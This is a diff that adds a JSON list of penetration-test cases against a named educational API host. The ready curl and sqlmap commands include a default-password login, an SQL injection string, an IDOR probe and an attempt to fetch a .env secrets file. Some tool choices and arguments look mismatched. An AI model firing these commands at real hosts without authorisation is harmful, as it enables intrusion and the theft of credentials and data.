@@ -1,0 +1,37 @@
+ [
+  {
+    "attack_vector": "Auth",
+    "test_scenario": "Check for weak password protection",
+    "full_payload_with_curl": "curl -X POST 'https://api-edunex.cognisia.id/login' -H 'Content-Type: application/json' --data-binary '{\"username\":\"admin\",\"password\":\"123456\"}'",
+    "recommended_tools": ["sqlmap"],
+    "tool_command_payload": ""
+  },
+  {
+    "attack_vector": "Injection",
+    "test_scenario": "Test SQL injection vulnerabilities on parameters",
+    "full_payload_with_curl": "curl -X GET 'https://api-edunex.cognisia.id/course/enrolls/courses?include=lecturer&parameter=\" OR 1=1;--' -H 'Content-Type: application/json'",
+    "recommended_tools": ["sqlmap"],
+    "tool_command_payload": "sqlmap -u 'https://api-edunex.cognisia.id/course/enrolls/courses?include=lecturer&parameter=\" OR 1=1;--' -p 'Get'"
+  },
+  {
+    "attack_vector": "Logic Flaws",
+    "test_scenario": "Test for resource exposure and insecure direct object references",
+    "full_payload_with_curl": "curl -X GET 'https://api-edunex.cognisia.id/course/enrolls/courses/77079' -H 'Content-Type: application/json'",
+    "recommended_tools": ["linkfinder"],
+    "tool_command_payload": ""
+  },
+  {
+    "attack_vector": "Misconfiguration",
+    "test_scenario": "Check for exposed sensitive files and unsecured endpoints",
+    "full_payload_with_curl": "curl -s 'https://api-edunex.cognisia.id/public/.env' -o output.txt",
+    "recommended_tools": ["trufflehog"],
+    "tool_command_payload": ""
+  },
+  {
+    "attack_vector": "Info-Leak",
+    "test_scenario": "Test for leaked information from logs and responses",
+    "full_payload_with_curl": "curl -X GET 'https://api-edunex.cognisia.id/course/enrolls/courses' -H 'Authorization: Bearer <token>'",
+    "recommended_tools": ["inql/graphqlmap"],
+    "tool_command_payload": ""
+  }
+]
